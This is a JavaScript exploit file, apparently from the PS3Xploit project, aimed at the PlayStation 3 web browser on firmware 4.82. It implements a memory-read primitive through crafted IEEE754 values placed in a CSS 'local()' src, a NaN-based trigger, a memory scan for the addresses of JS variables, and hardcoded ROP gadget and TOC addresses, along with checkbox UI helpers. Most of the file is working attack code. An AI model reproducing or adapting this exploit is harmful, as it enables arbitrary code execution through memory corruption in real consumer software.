var debug=false;
var br="<br>";
var hr="<hr>";
var t_out=0;
var total_loops=0;
var max_loops=20;
var sp_exit=0x8FD8DCC0;
var toc_addr=0;
var gadget1_addr=0;
var gadget2_addr=0;
var gadget3_addr=0;
var gadget4_addr=0;
var gadget5_addr=0;
var gadget6_addr=0;
var gadget7_addr=0;
var gadget8_addr=0;
var usb_fp,stack_frame,jump_2,jump_1;
var usb_fp_addr,stack_frame_addr,jump_2_addr,jump_1_addr;
var used_port=0;
var n, y, m, d;
function asciiAt(str, i){
	return str.charCodeAt(i)&0xFF;
}
function str2ascii(str){
	var ascii = "";
	var i = 0;
	for (; i < str.length; i++){ascii += str.charCodeAt(i).toString(16);}
	return ascii;
}
function hexh2bin(hex_val)
{
return String.fromCharCode(hex_val);

}
function hexw2bin(hex_val)
{
	return String.fromCharCode(hex_val >> 16) + String.fromCharCode(hex_val);
}
function s2hex(str){
	var hex = [];
	var  i = 0;
    for (;i < str.length; i++) {
		hex.push(hex16(str.charCodeAt(i).toString(16)));
    }
	return hex.join("");
}
function hex32(s){
	return ('00000000' + s).substr(-8);
}
function hex16(s){
	return ('0000' + s).substr(-4)
}
function hex8(s){
	return ('00' + s).substr(-2);
}
function convertString(str) {
	var asciistr = str2ascii(str);
	if((asciistr.length%4)!=0)asciistr+='00';
	var asciichr;
    var ret = [];
    var i;
    var len;
    for(i = 0, len = asciistr.length; i < len; i += 4) {
	   asciichr = asciistr.substr(i, 4);
       ret.push(String.fromCharCode(parseInt(asciichr, 16)));
    }
    return ret.join('');
}
function sleep(milliseconds){
  var start = new Date().getTime();
  for (var i = 0; i < 1e7; i++) {
    if ((new Date().getTime() - start) > milliseconds){
      break;
    }
  }
}
function logAdd(txt){
	if(debug===true)
	{
		if(document.getElementById("log").innerHTML==="")document.getElementById("log").innerHTML=hr;
		document.getElementById("log").innerHTML += txt + br;
	}
	
}
function clearLogEntry(){
	document.getElementById("log").innerHTML = "";
}
function writeEnvInfo(){
	document.getElementById('footer').innerHTML=hr+"<h3>PS3 System Browser Info:</h3>"+navigator.userAgent+br+navigator.appName+" (" + navigator.platform + ")"+br+new Date().toTimeString() + br;
}
function setCharAt(str,index,chr){
	if(index > str.length-1) return str;
	return str.substr(0,index) + chr + str.substr(index+1);
}
String.prototype.replaceAt=function(index, ch){
	return this.substr(0, index) + ch + this.substr(index+ch.length);
}

//#########################################################################################################################################################################

Number.prototype.noExponents=function()
{
    var data= String(this).split(/[eE]/);
    if(data.length== 1) return data[0]; 
    var  z= '', sign= this<0? '-':'',
    str= data[0].replace('.', ''),
    mag= Number(data[1])+ 1;
    if(mag<0){
        z= sign + '0.';
        while(mag++) z += '0';
        return z + str.replace(/^\-/,'');
    }
    mag -= str.length;  
    while(mag--) z += '0';
    return str + z;
}
function fromIEEE754(bytes, ebits, fbits)
{
	var retNumber = 0;
	var bits = [];
	for (var i = bytes.length; i; i -= 1)
	{
		var byte = bytes[i - 1];
		for (var j = 8; j; j -= 1)
		{
			bits.push(byte % 2 ? 1 : 0); byte = byte >> 1;
		}
	}
	bits.reverse();
	var str = bits.join('');
	var bias = (1 << (ebits - 1)) - 1;
	var s = parseInt(str.substring(0, 1), 2) ? -1 : 1;
	var e = parseInt(str.substring(1, 1 + ebits), 2);
	var f = parseInt(str.substring(1 + ebits), 2);
	if (e === (1 << ebits) - 1)
	{
		retNumber = f !== 0 ? NaN : s * Infinity;
	}
	else if (e > 0)
	{
		retNumber = s * Math.pow(2, e - bias) * (1 + f / Math.pow(2, fbits));
	}
	else if (f !== 0)
	{
		retNumber = s * Math.pow(2, -(bias-1)) * (f / Math.pow(2, fbits));
	}
	else
	{
		retNumber = s * 0;
	}
	return retNumber.noExponents();
}
function generateIEEE754(address, size)
{
	var hex = new Array
	(
		(address >> 24) & 0xFF,
		(address >> 16) & 0xFF,
		(address >> 8) & 0xFF,
		(address) & 0xFF,
		
		(size >> 24) & 0xFF,
		(size >> 16) & 0xFF,
		(size >> 8) & 0xFF,
		(size) & 0xFF
	);
	return fromIEEE754(hex, 11, 52);
}
function generateExploit(address, size)
{
	var n = (address<<32) | ((size>>1)-1);
	return generateIEEE754(address, (n-address));
}

function readMemory(address, size)
{
	document.getElementById('exploit').style.src = "local(" + generateExploit(address, size) + ")";
}
function checkMemory(address, size, len)
{
	readMemory(address, size);
	if(debug===true)
	{
		var x=document.getElementById('exploit').style.src.substr(6,len);
		logAdd("checkMemory: "+s2hex(x));
		return x;
	}
	return document.getElementById('exploit').style.src.substr(6,len);
}

function trigger(exploit_addr){
	document.getElementById("trigger").innerHTML = -parseFloat("NAN(ffffe" + exploit_addr.toString(16) + ")");
}

//####################################################################################################################################################################
function success(str)
{
	// operations to execute on ROP exit
	showResult(str);
}
function enable_trigger()
{
	if(document.getElementById('btnTrigger'))document.getElementById('btnTrigger').disabled=false;
	if(document.getElementById('btnReset'))document.getElementById('btnReset').disabled=false;
}

function resetOptions(cleanResult)
{

	if(document.getElementById('usb0'))document.getElementById('usb0').checked=true;
	if(document.getElementById('usb1'))document.getElementById('usb1').checked=false;
	if(document.getElementById('usb6'))document.getElementById('usb6').checked=false;
	if(document.getElementById('sd'))document.getElementById('sd').checked=false;
	if(document.getElementById('cf'))document.getElementById('cf').checked=false;
	if(document.getElementById('ms'))document.getElementById('ms').checked=false;
	if(cleanResult==true)document.getElementById('result').innerHTML="";
	cleanGUI();
	used_port=0;
}
function cleanGUI()
{
	enable_cb();
	enable_btn();
	if(document.getElementById('btnTrigger'))document.getElementById('btnTrigger').disabled=true;
	if(document.getElementById('step2'))document.getElementById('step2').innerHTML="<h3><b>Wait for the exploit initialization to succeed...</b></h3>";
	document.getElementById('log').innerHTML="";
	t_out=0;
	total_loops=0;
}
function disable_cb()
{
	if(document.getElementById('usb0'))document.getElementById('usb0').disabled=true;
	if(document.getElementById('usb1'))document.getElementById('usb1').disabled=true;
	if(document.getElementById('usb6'))document.getElementById('usb6').disabled=true;
	if(document.getElementById('sd'))document.getElementById('sd').disabled=true;
	if(document.getElementById('cf'))document.getElementById('cf').disabled=true;
	if(document.getElementById('ms'))document.getElementById('ms').disabled=true;
}
function enable_cb()
{
	if(document.getElementById('usb0'))document.getElementById('usb0').disabled=false;
	if(document.getElementById('usb1'))document.getElementById('usb1').disabled=false;
	if(document.getElementById('usb6'))document.getElementById('usb6').disabled=false;
	if(document.getElementById('sd'))document.getElementById('sd').disabled=false;
	if(document.getElementById('cf'))document.getElementById('cf').disabled=false;
	if(document.getElementById('ms'))document.getElementById('ms').disabled=false;
}
function disable_btn()
{
	if(document.getElementById('btnROP'))document.getElementById('btnROP').disabled=true;
	if(document.getElementById('btnReset'))document.getElementById('btnReset').disabled=true;
	if(document.getElementById('btnTrigger'))document.getElementById('btnTrigger').disabled=true;
}
function enable_btn()
{
	if(document.getElementById('btnROP'))document.getElementById('btnROP').disabled=false;
	if(document.getElementById('btnReset'))document.getElementById('btnReset').disabled=false;
	if(document.getElementById('btnTrigger'))document.getElementById('btnTrigger').disabled=false;
}
function usb(port)
{
	var usb_0=null, usb_1=null, usb_6=null, sd_0=null, cf_0=null, ms_0=null;
	if(document.getElementById('usb0'))usb_0=document.getElementById('usb0');
	if(document.getElementById('usb1'))usb_1=document.getElementById('usb1');
	if(document.getElementById('usb6'))usb_6=document.getElementById('usb6');
	if(document.getElementById('sd'))sd_0=document.getElementById('sd');
	if(document.getElementById('cf'))cf_0=document.getElementById('cf');
	if(document.getElementById('ms'))ms_0=document.getElementById('ms');
	if((usb_0!==null)&&(usb_1!==null)&&(usb_6!==null)&&(sd_0!==null)&&(cf_0!==null)&&(ms_0!==null))
	{
		if((sd_0.checked===false)&&(cf_0.checked===false)&&(ms_0.checked===false)&&(usb_0.checked===false)&&(usb_1.checked===false)&&(usb_6.checked===false)){usb_0.checked=true;port=0;}
	}
	else if((usb_0!==null)&&(usb_1!==null)&&(usb_6!==null))
	{
		if((usb_0.checked===false)&&(usb_1.checked===false)&&(usb_6.checked===false)){usb_0.checked=true;port=0;}
	}
	else 
	{
		logAdd("Malformed HTML checkbox options!");
		return;
	}
	
switch (port){

case 1:
		used_port=1;
		usb_0.checked=false;
		usb_6.checked=false;
		if(sd_0!==null)sd_0.checked=false;
		if(cf_0!==null)cf_0.checked=false;
		if(ms_0!==null)ms_0.checked=false;
		break;
case 6:
		used_port=6;
		usb_0.checked=false;
		usb_1.checked=false;
		if(sd_0!==null)sd_0.checked=false;
		if(cf_0!==null)cf_0.checked=false;
		if(ms_0!==null)ms_0.checked=false;
		break;
		
case 1000:
		used_port=1000;
		usb_0.checked=false;
		usb_1.checked=false;
		usb_6.checked=false;
		if(cf_0!==null)cf_0.checked=false;
		if(ms_0!==null)ms_0.checked=false;
		break;
case 1001:
		used_port=1001;
		usb_0.checked=false;
		usb_1.checked=false;
		usb_6.checked=false;
		if(sd_0!==null)sd_0.checked=false;
		if(ms_0!==null)ms_0.checked=false;
		break;
case 1002:
		used_port=1002;
		usb_0.checked=false;
		usb_1.checked=false;
		usb_6.checked=false;
		if(sd_0!==null)sd_0.checked=false;
		if(cf_0!==null)cf_0.checked=false;
		break;
default:
		used_port=0;
		usb_1.checked=false;
		usb_6.checked=false;
		if(sd_0!==null)sd_0.checked=false;
		if(cf_0!==null)cf_0.checked=false;
		if(ms_0!==null)ms_0.checked=false;
		break;
}
}
function showResult(str)
{
	document.getElementById('result').innerHTML=str;
}
function findJsVariableOffset(name,exploit_data,base,size)
{
	readMemory(base,size);
	var dat=document.getElementById('exploit').style.src.substr(6,size);
	for (var i=0;i<(dat.length*2);i+=0x10)	{
		if (dat.charCodeAt(i/2)===exploit_data.charCodeAt(0))
		{
			var match=0;
			for (var k=0;k<(exploit_data.length*2);k+=0x2)
			{
				if (dat.charCodeAt((i+k)/2) !== exploit_data.charCodeAt(k/2))break;
				match+=1;
			}
			if (match===exploit_data.length)
			{
				var exploit_addr=base+i+4;
				logAdd("Found "+name+" at: 0x"+exploit_addr.toString(16)+br+s2hex(exploit_data));
				return exploit_addr;
			}
		}
	}
	var end_range=base+size;
	logAdd("The string variable named "+name+" could not be located in range 0x"+base.toString(16)+" - 0x"+end_range.toString(16));
	return 0;
}

//####################################################################################################################################################################
function ps3chk(){
	var fwCompat = ["4.82"];
	var ua = navigator.userAgent;
	var uaStringCheck = ua.substring(ua.indexOf("5.0 (") + 5, ua.indexOf(") Apple") - 7);
	var fwVersion = ua.substring(ua.indexOf("5.0 (") + 19, ua.indexOf(") Apple"));
	resetOptions();
	switch (uaStringCheck) {
		case "PLAYSTATION":
			switch (fwVersion) {
				case fwCompat[0]:
					alert("Congratulations! We've detected your PlayStation 3 is running FW " + fwVersion + ", which is compatible with PS3Xploit! Enjoy!");
					toc_addr=0x6F5550;
					gadget1_addr=0x097604;
					gadget2_addr=0x60EF38;
					gadget3_addr=0x0D9684;
					gadget4_addr=0x0DB054;
					gadget5_addr=0x19D3AC;
					gadget6_addr=0x42C778;
					gadget7_addr=0x423854;
					gadget8_addr=0x2BACB8;
					break;
					
				default:
					alert("Your PS3 is not on FW 4.82! Your current running FW version is " + fwVersion + ", which is not compatible with PS3Xploit Flasher. All features have been disabled");
					disable_btn();
					disable_cb();
					break;
			}
			break;
		default:
			alert("You are not on a PlayStation System! All features have been disabled");
			disable_btn();
			disable_cb();
			break;
	}
}
